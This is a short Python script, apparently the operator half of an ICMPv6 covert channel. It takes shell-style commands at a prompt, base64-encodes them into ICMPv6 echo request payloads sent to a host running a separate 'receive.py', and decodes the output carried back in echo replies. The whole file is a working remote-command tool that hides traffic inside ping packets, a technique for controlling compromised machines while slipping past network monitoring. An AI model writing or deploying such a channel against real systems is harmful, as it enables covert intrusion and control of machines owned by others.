#!/usr/bin/env python

from scapy.all import *
import base64
import re

destip = "" # set the destination IP running receive.py

def main():
    seqno = 0
    while True:
        command = raw_input('$ ')
        command = str(base64.b64encode(command.encode("utf-8")))
        pinger = IPv6(dst=destip)/ICMPv6EchoRequest(data=command, seq=seqno)
        send(pinger)
	rx = sniff(filter="icmp6 && ip6[40] == 129", count=1)
        response=base64.b64decode(rx[0].data)
        print(response)
	seqno += 1

if __name__ == "__main__":
    main()

